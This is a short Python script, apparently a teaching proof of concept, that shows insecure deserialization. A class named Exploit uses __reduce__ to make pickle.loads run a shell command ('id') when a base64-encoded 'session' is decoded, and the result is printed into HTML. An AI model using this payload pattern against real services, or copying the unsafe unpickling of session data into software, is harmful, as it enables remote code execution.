import os
import pickle
import base64
import subprocess

class Exploit(object):
    def __reduce__(self):
        return (subprocess.check_output, ('id',))



session = base64.b64encode(pickle.dumps({"name" : Exploit(), "age" : "13"}))



user = pickle.loads(base64.b64decode(session))

print(f'<p>Name: {user["name"]}</p><p>Age: {user["age"]}</p>')